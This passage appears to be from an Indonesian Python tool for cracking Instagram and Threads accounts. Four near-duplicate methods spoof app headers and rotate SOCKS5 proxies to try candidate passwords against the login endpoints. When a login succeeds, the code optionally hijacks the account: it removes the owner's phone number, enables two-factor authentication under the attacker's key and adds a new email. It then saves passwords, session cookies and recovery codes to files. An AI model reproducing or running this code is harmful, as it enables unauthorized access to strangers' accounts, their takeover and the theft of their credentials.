                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
